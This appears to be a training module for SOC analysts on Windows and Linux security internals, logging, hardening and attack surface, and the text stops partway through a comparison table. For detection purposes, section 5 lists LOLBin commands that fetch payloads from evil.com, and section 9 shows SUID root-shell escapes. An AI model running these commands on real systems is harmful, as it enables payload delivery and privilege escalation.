# Session 12: Operating System Fundamentals — Windows and Linux Security

**Estimated reading time:** ~2 hours

## Table of Contents

1. [Why OS Security Matters in a SOC](#1-why-os-security-matters-in-a-soc)
1. [Windows Security Architecture](#2-windows-security-architecture)
1. [Windows Key Security Features](#3-windows-key-security-features)
1. [Windows Log Sources for SOC](#4-windows-log-sources-for-soc)
1. [Windows Attack Surface](#5-windows-attack-surface)
1. [Linux Security Architecture](#6-linux-security-architecture)
1. [Linux Key Security Features](#7-linux-key-security-features)
1. [Linux Log Sources for SOC](#8-linux-log-sources-for-soc)
1. [Linux Attack Surface](#9-linux-attack-surface)
1. [Windows vs. Linux — Security Comparison](#10-windows-vs-linux--security-comparison)
1. [OS Hardening Fundamentals: CIS Benchmarks](#11-os-hardening-fundamentals-cis-benchmarks)
1. [Forensic Artifacts — Windows](#12-forensic-artifacts--windows)
1. [Forensic Artifacts — Linux](#13-forensic-artifacts--linux)
1. [Live Response Techniques](#14-live-response-techniques)
1. [Summary and Key Takeaways](#15-summary-and-key-takeaways)
1. [References](#16-references)

---

## 1. Why OS Security Matters in a SOC

The operating system is the foundation of every digital asset.
Every endpoint, server, and cloud workload runs an OS.
When threat actors gain access to a network, they nearly always interact with the OS to:

* Execute malware and exploits
* Escalate privileges to gain administrator/root access
* Move laterally to other systems
* Establish persistence to survive reboots and re-imaging
* Exfiltrate data through normal OS mechanisms

SOC analysts who understand OS internals can:

* **Detect** attacker activity hidden in process trees, scheduled tasks, registry keys, and log files
* **Investigate** suspicious behavior by interpreting OS logs and artifacts
* **Hunt** proactively for malware persistence mechanisms
* **Prioritize** alerts based on OS-level context

This session covers the security-relevant aspects of both Windows and Linux — the two dominant OS platforms in enterprise environments.

---

## 2. Windows Security Architecture

### The Windows Security Subsystem

Windows enforces access control through a set of tightly integrated components:

```text
┌─────────────────────────────────────────────────────┐
│                      USER SPACE                     │
│                                                     │
│   Win32 Applications   │   Security Subsystem       │
│   (Explorer, Office)   │   (LSASS.exe)              │
│                        │                            │
│   Service Control Mgr  │   SAM / Active Directory   │
├─────────────────────────────────────────────────────┤
│                    KERNEL SPACE                     │
│                                                     │
│   Security Reference   │   Object Manager           │
│   Monitor (SRM)        │   (ACL enforcement)        │
│                        │                            │
│   Win32k.sys           │   Process / Thread Mgr     │
│   (GUI, GDI)           │   Memory Manager           │
│                        │   I/O Manager              │
├─────────────────────────────────────────────────────┤
│            HARDWARE ABSTRACTION LAYER (HAL)         │
└─────────────────────────────────────────────────────┘
```

### LSASS — Local Security Authority Subsystem Service

**LSASS** (`lsass.exe`) is one of the most security-critical processes on Windows.
It:

* Authenticates users (validates credentials against SAM or Active Directory)
* Creates and manages access tokens
* Enforces local security policy
* Manages Kerberos and NTLM authentication protocols
* Stores credential material in memory (NTLM hashes, Kerberos tickets, plaintext passwords in older configurations)

**Why attackers target LSASS:**
Tools like Mimikatz dump credentials directly from LSASS memory.
This is why Windows Credential Guard (virtualization-based isolation of LSASS) was introduced in Windows 10 — it moves LSASS into a protected virtual machine even the OS kernel cannot read.

```powershell
# SOC: Monitor for processes attempting to access LSASS memory
# Event ID 4656 (Handle Request) + 4663 (Object Access) on lsass.exe
# with access mask 0x1010 (PROCESS_VM_READ)

# Common attack pattern:
# - Process opening handle to lsass.exe with PROCESS_VM_READ
# - Often: Task Manager "Create Dump" or procdump.exe targeting lsass.exe
```

### SAM — Security Account Manager

The **SAM** database stores local user accounts and their password hashes:

* File location: `C:\Windows\System32\config\SAM`
* Registry path: `HKLM\SAM`
* The SAM hive is locked while Windows is running
* Contains NTLM hashes of all local user passwords

**Attack context:** Tools like `samdump2`, Impacket's `secretsdump`, and Mimikatz's `lsadump::sam` extract password hashes from SAM.
Attackers then use Pass-the-Hash (PtH) techniques to authenticate without knowing the plaintext password.

```powershell
# Detect SAM access attempts (should only come from LSASS)
# Event ID 4661: A handle to an object was requested
# Object: \Device\HarddiskVolume\Windows\System32\config\SAM
# Any process OTHER than lsass.exe touching SAM is suspicious
```

### Windows Registry

The Registry is a hierarchical database storing OS and application configuration.
It is critical for both attackers (persistence) and defenders (forensics).

**Key hives:**

| Hive | File Location | Description |
|------|--------------|-------------|
| HKEY_LOCAL_MACHINE (HKLM) | `C:\Windows\System32\config\` | System-wide settings |
| HKEY_CURRENT_USER (HKCU) | `C:\Users\<user>\NTUSER.DAT` | Per-user settings |
| HKEY_USERS (HKU) | Multiple `NTUSER.DAT` files | All loaded user profiles |
| HKEY_CLASSES_ROOT (HKCR) | Merged view of HKLM+HKCU | File associations, COM |

**Security-critical registry keys:**

```text
# Persistence (Run at logon)
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Malicious services
HKLM\SYSTEM\CurrentControlSet\Services

# Winlogon shell replacement (used by some rootkits)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  Userinit = C:\Windows\system32\userinit.exe,  (comma required)
  Shell = explorer.exe  (malware may replace this)

# LSA security settings
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  LMCompatibilityLevel  (NTLMv1 vs v2)
  RunAsPPL = 1  (LSASS Protected Process Light)

# Safe boot persistence (survives safe mode)
HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal
```

### User Account Control (UAC)

UAC splits standard user accounts into two tokens: a filtered (standard) token and a full administrative token.
When an app needs elevation, Windows prompts via the Secure Desktop.
This limits the blast radius of malware running as a regular user.

**UAC Bypass techniques (MITRE ATT&CK T1548.002):**

* `fodhelper.exe` — reads HKCU registry before spawning with high integrity
* `eventvwr.exe` — auto-elevated binary that reads a HKCU class registration
* Token impersonation — stealing a high-integrity token from another process
* DLL side-loading into an auto-elevated process

```powershell
# Detect UAC bypass: process with high integrity level spawned by medium process
# Look for integrity level mismatch in parent/child relationships
# Event ID 4688: process creation with unexpected integrity level
```

### Security Identifiers (SIDs) and Access Tokens

Every user, group, and machine has a unique SID.
Access control decisions use SIDs.

```text
S-1-5-21-[domain]-500   # Built-in Administrator
S-1-5-21-[domain]-512   # Domain Admins group
S-1-1-0                 # Everyone
S-1-5-18                # NT AUTHORITY\SYSTEM
S-1-5-19                # NT AUTHORITY\LOCAL SERVICE
S-1-5-20                # NT AUTHORITY\NETWORK SERVICE
```

**Access Token contents:**

* User SID and group SIDs
* Privileges list (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
* Mandatory integrity level (Low/Medium/High/System)
* Logon session identifier

**SeDebugPrivilege** is particularly dangerous — it grants the ability to open any process (including LSASS) for debugging.
Any process with this privilege can dump credentials.

---

## 3. Windows Key Security Features

### BitLocker — Full Disk Encryption

BitLocker encrypts entire volumes using AES (128-bit or 256-bit).
It protects data at rest from physical theft or offline attacks.

**Key components:**

* **TPM (Trusted Platform Module):** Stores the Volume Master Key (VMK); sealed to platform state measurements
* **BitLocker Recovery Key:** 48-character numeric key stored in AD, Azure AD, or a file
* **Pre-boot authentication:** PIN + TPM for stronger protection

```powershell
# Check BitLocker status on all drives
Get-BitLockerVolume

# Enable BitLocker on C: with TPM + PIN
Enable-BitLocker -MountPoint "C:" -EncryptionMethod Aes256 -Pin (Read-Host "Enter PIN" -AsSecureString) -TpmAndPinProtector

# Backup recovery key to Active Directory
Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $keyid
```

**SOC relevance:** BitLocker does NOT protect against running threats.
If an attacker has code execution while Windows is booted, BitLocker is transparent to them.

### Windows Firewall with Advanced Security

Windows Firewall operates at the kernel level using the Windows Filtering Platform (WFP).

```powershell
# Check all profiles status
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction

# List all inbound allow rules
Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True |
  Select-Object DisplayName, Profile, LocalPort

# Block a specific IP
New-NetFirewallRule -Name "Block_Attacker" -Direction Inbound -Action Block `
  -RemoteAddress "10.0.5.123"

# Log dropped packets
Set-NetFirewallProfile -LogBlocked True -LogFileName "%systemroot%\system32\LogFiles\Firewall\pfirewall.log"
```

### AppLocker — Application Allowlisting

AppLocker restricts which executables, scripts, DLLs, and MSIs can run based on:

* Publisher (digital signature)
* Path
* Hash

```powershell
# View current effective policy
Get-AppLockerPolicy -Effective | Format-List

# Test if a file would be allowed
Test-AppLockerPolicy -Path "C:\Windows\System32\cmd.exe" -User "domain\jdoe"

# Create a publisher rule
New-AppLockerPolicy -FileInformation (Get-AppLockerFileInformation -Path "C:\Program Files\7-Zip\7z.exe") `
  -RuleType Publisher -User "Everyone" -Xml | Set-AppLockerPolicy

# AppLocker events
Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" |
  Where-Object {$_.Id -eq 8004}  # 8004 = blocked execution
```

### Credential Guard

Credential Guard uses virtualization-based security (VBS) to isolate LSASS into a separate virtual machine (Isolated LSA / LSAIso), preventing credential extraction even if the OS kernel is compromised.

**Requirements:** 64-bit Windows, UEFI 2.3.1+, Secure Boot, Hyper-V, TPM 2.0

```powershell
# Check if Credential Guard is running
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
  Select-Object SecurityServicesRunning
# Value 1 = Credential Guard running
# Value 2 = HVCI (Hypervisor-Protected Code Integrity) running

# Check via registry
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\LSA" | Select-Object LsaCfgFlags
```

### Windows Defender Antivirus and ATP

Windows Defender now includes multiple layers:

* **Antivirus engine:** signature + behavior monitoring
* **Attack Surface Reduction (ASR) rules:** block specific high-risk behaviors
* **Controlled Folder Access:** ransomware protection for user files
* **Microsoft Defender for Endpoint (MDE):** EDR/XDR with cloud intelligence

```powershell
# Check Windows Defender status
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, NISEnabled

# Run a quick scan
Start-MpScan -ScanType QuickScan

# View recent threats detected
Get-MpThreatDetection | Select-Object ThreatName, ActionSuccess, DomainUser, InitialDetectionTime
```

### Sysmon (System Monitor)

Sysmon is a free Sysinternals tool that provides detailed process, network, and registry monitoring.
It feeds critical telemetry to SIEM platforms.

**Key Sysmon Event IDs:**

| Event ID | Description |
|----------|-------------|
| 1 | Process creation (with full command line) |
| 3 | Network connection |
| 7 | Image loaded (DLL loads) |
| 8 | CreateRemoteThread (process injection) |
| 10 | ProcessAccess (LSASS dumping) |
| 11 | FileCreate |
| 12/13/14 | Registry events |
| 17/18 | Pipe created/connected |
| 22 | DNS query |
| 23 | File deleted |

```xml
<!-- Example Sysmon config targeting LSASS access -->
<EventFiltering>
  <ProcessAccess onmatch="include">
    <TargetImage condition="is">C:\Windows\system32\lsass.exe</TargetImage>
  </ProcessAccess>
</EventFiltering>
```

---

## 4. Windows Log Sources for SOC

### Event Viewer and Windows Event Log Architecture

Windows stores logs in `.evtx` format in `C:\Windows\System32\winevt\Logs\`.
Key channels:

| Channel | Path | Contents |
|---------|------|---------|
| Security | `Security.evtx` | Auth, object access, policy changes |
| System | `System.evtx` | OS components, services, drivers |
| Application | `Application.evtx` | App-specific events |
| PowerShell Operational | `PowerShell-Operational.evtx` | Script execution, module loads |
| Sysmon | `Microsoft-Windows-Sysmon/Operational.evtx` | Detailed process/network/registry |
| AppLocker | `Microsoft-Windows-AppLocker/EXE and DLL.evtx` | Blocked executions |
| WMI Activity | `Microsoft-Windows-WMI-Activity/Operational.evtx` | WMI queries (fileless malware) |

### Critical Security Event IDs

| Event ID | Channel | Description | SOC Use |
|----------|---------|-------------|---------|
| **4624** | Security | Successful logon | Track all logins; Logon Type 3 = network, 10 = remote interactive |
| **4625** | Security | Failed logon | Brute-force detection; count failures per account/IP |
| **4648** | Security | Explicit credential logon | Pass-the-hash, lateral movement |
| **4672** | Security | Special privileges at logon | Administrator/privileged logon |
| **4688** | Security | New process created | Process monitoring (enable command-line logging) |
| **4698** | Security | Scheduled task created | Persistence detection |
| **4699** | Security | Scheduled task deleted | Anti-forensics |
| **4720** | Security | User account created | Backdoor account creation |
| **4728/4732** | Security | Member added to security group | Privilege escalation |
| **4740** | Security | Account locked out | Brute-force victim identification |
| **4768** | Security | Kerberos TGT requested | DCSync attack setup, Kerberoasting |
| **4769** | Security | Kerberos service ticket requested | Kerberoasting detection |
| **4776** | Security | NTLM credential validation | NTLM authentication; detect relay attacks |
| **7045** | System | New service installed | Malicious service persistence |
| **1102** | Security | Audit log cleared | Anti-forensics indicator |
| **4657** | Security | Registry value modified | Registry persistence changes |
| **4103/4104** | PowerShell | Script block logging | PowerShell-based attacks |

**Logon Type codes for Event ID 4624/4625:**

| Type | Name | Description |
|------|------|-------------|
| 2 | Interactive | Physical console |
| 3 | Network | SMB, net use, scheduled tasks |
| 4 | Batch | Scheduled tasks |
| 5 | Service | Service account startup |
| 7 | Unlock | Workstation unlock |
| 8 | NetworkCleartext | Basic auth (IIS) |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | Offline login with cached creds |

### ETW — Event Tracing for Windows

ETW is the high-performance kernel tracing framework underlying Windows logging:

```powershell
# List active ETW providers
logman query providers

# Start a custom ETW trace (example: kernel process events)
logman start "SOC-Trace" -p "Microsoft-Windows-Kernel-Process" -o trace.etl -ets

# Convert ETW trace to readable format
tracerpt trace.etl -o trace.xml -of XML
```

ETW is used by advanced detection tools (EDR products, Microsoft Defender for Endpoint) to get higher-fidelity telemetry than the Windows Event Log alone.

### PowerShell Logging

```powershell
# Enable module logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
  -Name "EnableModuleLogging" -Value 1

# Enable script block logging (captures obfuscated scripts decoded)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
  -Name "EnableScriptBlockLogging" -Value 1

# View PowerShell script block events
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object {$_.Id -eq 4104} |
  Select-Object TimeCreated, Message | Format-List
```

---

## 5. Windows Attack Surface

### Common Attack Vectors

**Lateral movement techniques:**

| Technique | MITRE ID | Description | Detection |
|-----------|----------|-------------|-----------|
| Pass-the-Hash | T1550.002 | Use NTLM hash without cracking | Event 4624 Logon Type 3 with known hash |
| Pass-the-Ticket | T1550.003 | Forge/steal Kerberos tickets | Unusual Kerberos TGT requests |
| Overpass-the-Hash | T1550.002 | Convert hash to Kerberos ticket | Mimikatz sekurlsa::pth pattern |
| Remote Service | T1021 | PsExec, WMI, WinRM remote execution | Event 7045, 4688 with remote logins |
| DCSync | T1003.006 | Request domain replication credentials | Event 4662 with directory replication GUIDs |

**Common Windows attack vectors:**

1. **Phishing with malicious macros:** Office documents execute VBA → drops PowerShell loader → installs implant
1. **Exposed RDP (TCP 3389):** Brute force or credential stuffing; BlueKeep/DejaBlue vulnerabilities
1. **PrintNightmare (CVE-2021-1675):** Local privilege escalation via Windows Print Spooler
1. **ZeroLogon (CVE-2020-1472):** Unauthenticated domain takeover via Netlogon
1. **NTLM relay attacks:** Capture NTLM challenge/response via tools like Responder; relay to other services

**Living off the Land Binaries (LOLBins):**
Attackers use legitimate Windows tools to avoid AV detection:

```powershell
# LOLBin examples SOC analysts must monitor
certutil.exe -urlcache -f http://evil.com/payload.exe  # File download
mshta.exe http://evil.com/payload.hta                  # Script execution
wmic.exe process call create "cmd /c payload.exe"      # Process creation
regsvr32.exe /s /u /i:http://evil.com/file.sct        # COM scriptlet execution
rundll32.exe javascript:"..mshtml,RunHTMLApplication"  # Script in DLL context
bitsadmin.exe /transfer /Download http://evil.com/p   # BITS-based download
```

---

## 6. Linux Security Architecture

### The Linux Security Model

Linux security is built on layered mechanisms:

```text
┌─────────────────────────────────────────────────────┐
│              APPLICATION LAYER                      │
│   User processes, services (apache, sshd, etc.)     │
├─────────────────────────────────────────────────────┤
│         MANDATORY ACCESS CONTROL (MAC)              │
│   SELinux (RHEL/CentOS) │ AppArmor (Ubuntu/Debian)  │
├─────────────────────────────────────────────────────┤
│      DISCRETIONARY ACCESS CONTROL (DAC)             │
│   UID/GID file permissions │ ACLs │ Capabilities    │
├─────────────────────────────────────────────────────┤
│              LINUX KERNEL                           │
│   Security hooks (LSM) │ Namespaces │ Seccomp        │
├─────────────────────────────────────────────────────┤
│              HARDWARE                               │
└─────────────────────────────────────────────────────┘
```

### Users and Groups

Linux identifies principals by numeric identifiers:

* **UID (User ID):** 0 = root (full privileges), 1-999 = system accounts, 1000+ = human users
* **GID (Group ID):** Primary group and supplementary groups
* **EUID (Effective UID):** The UID used for permission checks (may differ from real UID via SUID)

**Key files:**

```bash
# /etc/passwd — user accounts (world-readable, no passwords)
# Format: username:x:UID:GID:comment:home:shell
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
alice:x:1000:1000:Alice:/home/alice:/bin/bash

# /etc/shadow — password hashes (root-readable only)
# Format: username:hash:lastchange:min:max:warn:inactive:expire
alice:$6$rounds=5000$sALT$HASH:19000:0:99999:7:::

# /etc/group — group definitions
sudo:x:27:alice,bob    # Members of sudo group
```

**Hash format in /etc/shadow:**

```text
$id$rounds=N$salt$hash
$1$   = MD5 (obsolete, insecure)
$5$   = SHA-256
$6$   = SHA-512 (current standard)
$y$   = yescrypt (modern, memory-hard)
```

### File Permissions (DAC)

```text
-rwxr-xr-- 1 alice devs 4096 Jan 1 12:00 script.sh
│││││││││└── others: r--  (read only)
│││││││└──── group (devs): r-x (read, execute)
│││└──────── user (alice): rwx (read, write, execute)
│└─────────── file type (- = regular, d = dir, l = link)
```

**Special permission bits:**

| Bit | Symbol | Effect on Files | Effect on Directories |
|-----|--------|----------------|----------------------|
| SUID (4) | `rws` in owner-execute | Run as file owner (e.g., /usr/bin/passwd runs as root) | No standard effect |
| SGID (2) | `rws` in group-execute | Run as file group | New files inherit directory group |
| Sticky (1) | `rwt` in others-execute | No effect | Only owner can delete files (e.g., /tmp) |

```console
# Find SUID binaries (privilege escalation risk — must review each one)
find / -perm -4000 -type f 2>/dev/null

# Expected legitimate SUID binaries:
# /usr/bin/passwd, /usr/bin/sudo, /usr/bin/su
# /usr/bin/newgrp, /bin/mount, /bin/umount, /usr/bin/pkexec

# Any SUID binary NOT on this list must be investigated
```

### Linux Capabilities

Linux capabilities break the monolithic root privilege into ~41 discrete capabilities, allowing processes to have specific elevated permissions without full root:

```bash
# View capabilities of a binary
getcap /usr/bin/ping
# /usr/bin/ping cap_net_raw=ep  (needs raw sockets)

# View capabilities of a running process
cat /proc/<PID>/status | grep Cap

# Decode capability bitmask
capsh --decode=0000000000000002
# = CAP_DAC_OVERRIDE (bypass file permissions)

# Dangerous capabilities (attackers seek these)
CAP_SYS_ADMIN   # Nearly equivalent to root
CAP_NET_ADMIN   # Configure network interfaces
CAP_SETUID      # Change user ID (can become any user)
CAP_DAC_OVERRIDE # Bypass file permission checks
CAP_SYS_PTRACE  # Debug processes (can dump memory like LSASS)
```

### SELinux (Security-Enhanced Linux)

SELinux provides mandatory access control based on security contexts (labels):

```bash
# Check SELinux status
getenforce    # Enforcing / Permissive / Disabled
sestatus -v

# View file security contexts
ls -Z /etc/ssh/sshd_config
# -rw-r--r--. root root system_u:object_r:etc_t:s0 sshd_config

# View process security contexts
ps -eZ | grep httpd
# system_u:system_r:httpd_t:s0  httpd

# SELinux denials (audit.log)
ausearch -m avc -ts recent | head -20

# Generate a permissive rule from denials (be careful)
audit2why < /var/log/audit/audit.log
```

**SELinux modes:**

* **Enforcing:** Policy violations are denied and logged
* **Permissive:** Violations are logged but not blocked (used for troubleshooting)
* **Disabled:** SELinux is off entirely

### AppArmor (Ubuntu/Debian)

AppArmor confines individual programs to a set of files, capabilities, and network access:

```bash
# Check AppArmor status
aa-status

# Profiles are in /etc/apparmor.d/
ls /etc/apparmor.d/

# Example: nginx profile restricts file access
# /etc/apparmor.d/usr.sbin.nginx

# Reload a profile
apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx

# Set enforce vs. complain mode
aa-enforce /etc/apparmor.d/usr.sbin.nginx   # Block violations
aa-complain /etc/apparmor.d/usr.sbin.nginx  # Log only
```

---

## 7. Linux Key Security Features

### sudo — Controlled Privilege Escalation

`sudo` allows specific users to run commands as root (or another user) with logging:

```bash
# /etc/sudoers configuration
# Format: who  where = (as_whom) commands

# Best practices:
alice ALL=(root) /usr/bin/systemctl restart nginx   # Specific command only
bob   ALL=(ALL)  NOPASSWD: /usr/bin/apt-get update  # No password (use sparingly)

# Never use: username ALL=(ALL) NOPASSWD: ALL  (full unrestricted access)

# Check sudo permissions for a user
sudo -l -U alice

# View sudo usage logs
grep "sudo" /var/log/auth.log | grep "COMMAND"
journalctl _COMM=sudo
```

### PAM — Pluggable Authentication Modules

PAM provides a flexible authentication framework used by login, SSH, su, and other services:

```bash
# PAM configuration files
/etc/pam.d/sshd         # SSH authentication
/etc/pam.d/login        # Console login
/etc/pam.d/sudo         # sudo authentication
/etc/pam.d/common-auth  # Shared auth settings

# Example /etc/pam.d/sshd (critical lines):
auth required pam_faillock.so preauth        # Account lockout before auth
auth required pam_unix.so nullok try_first_pass  # Standard Unix password check
auth required pam_faillock.so authfail      # Record failure

# Configure password quality (pam_pwquality)
# /etc/security/pwquality.conf
minlen = 14
dcredit = -1   # Require at least 1 digit
ucredit = -1   # Require at least 1 uppercase
lcredit = -1   # Require at least 1 lowercase
ocredit = -1   # Require at least 1 special char
```

**PAM as an attack surface:** Attackers have been known to install backdoored PAM modules that log passwords or accept a master password.
Always verify PAM module integrity with package manager.

### SSH Hardening

SSH is the primary remote access protocol for Linux systems:

```bash
# /etc/ssh/sshd_config — security-critical settings

# Authentication
PermitRootLogin no               # Never allow direct root SSH
PasswordAuthentication no        # Key-only authentication
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
MaxAuthTries 3                   # Lockout after 3 failed attempts
LoginGraceTime 30

# Session security
ClientAliveInterval 300          # Send keepalive every 5 minutes
ClientAliveCountMax 2            # Disconnect after 2 missed keepalives
X11Forwarding no                 # Disable X11 forwarding
AllowAgentForwarding no          # No SSH agent forwarding

# Access control
AllowUsers alice bob             # Explicit allowlist (or AllowGroups)
DenyUsers guest www-data         # Block specific service accounts

# Algorithm restrictions (disable weak algorithms)
KexAlgorithms curve25519-sha256,diffie-hellman-group14-sha256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com
MACs hmac-sha2-256,hmac-sha2-512

# After changes:
sshd -t          # Test configuration
systemctl reload sshd
```

### iptables and nftables

**iptables** (traditional) and **nftables** (modern replacement) control Linux packet filtering:

```bash
# iptables — essential rules for a server
# Default policy: drop everything, then allow specific services

iptables -P INPUT DROP     # Default drop inbound
iptables -P FORWARD DROP   # Default drop forwarded
iptables -P OUTPUT ACCEPT  # Allow outbound (adjust for strict environments)

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH (from specific subnet only)
iptables -A INPUT -s 10.0.0.0/24 -p tcp --dport 22 -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Log dropped packets
iptables -A INPUT -j LOG --log-prefix "[IPTABLES DROP] " --log-level 4
iptables -A INPUT -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4

# nftables equivalent (modern systems):
nft add table ip filter
nft add chain ip filter input { type filter hook input priority 0 \; policy drop \; }
nft add rule ip filter input ct state established,related accept
nft add rule ip filter input iif lo accept
nft add rule ip filter input tcp dport 22 accept
```

### auditd — Linux Audit System

auditd provides kernel-level auditing of system calls, file access, and network activity:

```bash
# Install
apt install auditd audispd-plugins   # Debian/Ubuntu
yum install audit                     # RHEL/CentOS

# Key files:
/etc/audit/auditd.conf         # Daemon configuration
/etc/audit/rules.d/audit.rules # Audit rules
/var/log/audit/audit.log       # Audit log

# Example comprehensive audit rules:
# Watch sensitive files
-w /etc/passwd  -p wa -k identity
-w /etc/shadow  -p wa -k identity
-w /etc/group   -p wa -k identity
-w /etc/sudoers -p wa -k identity
-w /etc/sudoers.d/ -p rwa -k identity

# Monitor privilege escalation
-a always,exit -F path=/usr/bin/sudo  -F perm=x -F auid>=1000 -k privileged-sudo
-a always,exit -F path=/usr/bin/su    -F perm=x -F auid>=1000 -k privileged-su

# Monitor cron changes
-w /etc/cron.d/     -p wa -k scheduled-jobs
-w /etc/crontab     -p wa -k scheduled-jobs
-w /var/spool/cron/ -p wa -k scheduled-jobs

# Monitor SSH authorized keys
-a always,exit -F dir=/home -F filename=authorized_keys -F perm=wa -k ssh-keys

# Login events
-w /var/log/lastlog    -p wa -k logins
-w /var/run/faillock/  -p wa -k logins

# Network configuration changes
-a always,exit -F arch=b64 -S sethostname -S setdomainname -k system-locale
-w /etc/hosts   -p wa -k system-locale
-w /etc/network -p wa -k system-locale

# Apply rules (no reboot needed)
augenrules --load
auditctl -l   # List active rules

# Query audit logs
ausearch -k identity           # All events tagged "identity"
ausearch -k privileged-sudo    # sudo usage
ausearch -k logins             # Login events
aureport --auth --summary      # Authentication summary
aureport --failed              # Failed events summary
```

---

## 8. Linux Log Sources for SOC

### /var/log — Traditional Log Files

| File | Contents | Key Events to Monitor |
|------|---------|----------------------|
| `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL) | Authentication events | SSH logins, sudo usage, su attempts, PAM events |
| `/var/log/syslog` or `/var/log/messages` | General system messages | Service starts/stops, kernel events |
| `/var/log/kern.log` | Kernel messages | Device errors, OOM kills, security module messages |
| `/var/log/cron.log` or `/var/log/cron` | Cron execution | Scheduled job runs (attacker persistence) |
| `/var/log/dpkg.log` | Package installation (Debian) | Unauthorized software installation |
| `/var/log/yum.log` or `/var/log/dnf.log` | Package installation (RHEL) | Same |
| `/var/log/wtmp` | Binary login records | `last` command reads this; all logins |
| `/var/log/btmp` | Binary failed login records | `lastb` command reads this; brute force detection |
| `/var/log/lastlog` | Binary last login per user | `lastlog` command; detect dormant account activity |
| `/var/log/audit/audit.log` | Kernel audit events | auditd output — most comprehensive |

```bash
# Parse key log files for security events

# Failed SSH logins (brute force)
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Successful logins
grep "Accepted" /var/log/auth.log

# sudo usage (who ran what as root)
grep "COMMAND" /var/log/auth.log | awk '{print $5, $11, $NF}'

# New user creation
grep "useradd\|adduser\|groupadd" /var/log/auth.log

# Login history with IP addresses
last -i | head -30      # Recent logins with IPs from wtmp
lastb -i | head -30     # Recent failures from btmp
lastlog | grep -v "Never"  # Last login for each user
```

### journald — systemd Journal

systemd's journal stores structured logs in binary format with rich metadata:

```bash
# Basic queries
journalctl                          # All logs
journalctl -f                       # Follow (like tail -f)
journalctl -n 100                   # Last 100 entries
journalctl --since "2024-01-01" --until "2024-01-02"
journalctl -u sshd                  # sshd service logs
journalctl _COMM=sudo               # All sudo invocations
journalctl _UID=0                   # Events from root processes
journalctl -p err                   # Error priority and above

# Security-focused queries
journalctl -u sshd | grep "Failed\|Accepted\|Invalid"
journalctl _COMM=sudo | grep "COMMAND"
journalctl -k | grep -i "selinux\|apparmor\|audit"

# JSON output for SIEM ingestion
journalctl -u sshd -o json | python3 -m json.tool
```

---

## 9. Linux Attack Surface

### SUID Binaries

SUID binaries are among the most common Linux privilege escalation paths:

```bash
# A SUID binary lets attackers escalate if:
# 1. The binary has a shell escape (find, vim, less, python, etc.)
# 2. The binary can be exploited via a vulnerability
# 3. The binary is writable (so attackers can replace it)

# GTFOBins: curated list of SUID escapes
# Examples:
# find . -exec /bin/bash -p \;     # If find is SUID
# python -c 'import os; os.setuid(0); os.system("/bin/bash")'  # If python SUID

# Detection: compare current SUID list against baseline
find / -perm -4000 -type f 2>/dev/null | sort > current_suid.txt
diff baseline_suid.txt current_suid.txt    # Alert on differences
```

### World-Writable Files and Directories

```console
# World-writable files (any user can modify)
find / -perm -0002 -type f -not -path "/proc/*" 2>/dev/null

# World-writable directories (risk: attacker creates files)
find / -perm -0002 -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# /tmp and /dev/shm are normally world-writable (mount with noexec,nosuid)
# Flag any world-writable files outside these locations
```

### Cron Job Abuse

```bash
# Attacker-accessible cron locations:
/etc/crontab        # Root-owned system crontab
/etc/cron.d/        # Individual cron drop-in files
/etc/cron.hourly/   # Scripts run hourly
/etc/cron.daily/    # Scripts run daily
/var/spool/cron/crontabs/  # Per-user crontabs (stored as username)

# Attack scenario: if /etc/cron.d/ is world-writable, attacker adds a cron job
# Attack scenario: if a cron job runs a writable script, attacker modifies that script

# Detection
find /etc/cron* -perm -0002 2>/dev/null    # World-writable cron files
find /etc/cron* -newer /tmp/baseline 2>/dev/null  # Recently modified
```

### /proc Filesystem

The `/proc` virtual filesystem exposes kernel and process state:

```bash
# Process information
/proc/<PID>/cmdline   # Full command line with arguments
/proc/<PID>/exe       # Symlink to executable (shows "deleted" if file removed)
/proc/<PID>/maps      # Memory mappings
/proc/<PID>/net/tcp   # TCP connections for this process
/proc/<PID>/environ   # Environment variables (may contain secrets)
/proc/<PID>/fd/       # Open file descriptors

# Attack use: /proc/sysrq-trigger allows root to trigger kernel actions
# Attack use: /proc/kcore is a raw memory dump (restricted)
# Defense: mount /proc with hidepid=2 to hide other users' processes

# Example: hiding processes from non-root users (systemd-related)
# Add to /etc/fstab:
# proc /proc proc defaults,hidepid=2 0 0
```

---

## 10. Windows vs. Linux — Security Comparison

| Aspect | Windows | Linux |
|--------|---------|-------|
| **Access control model** | DACL/SACL + Mandatory Integrity Control (MIC) | DAC (rwx bits) + MAC (SELinux/AppArmor) |
| **Identity model** | SIDs, Access Tokens | UIDs/GIDs, PAM |
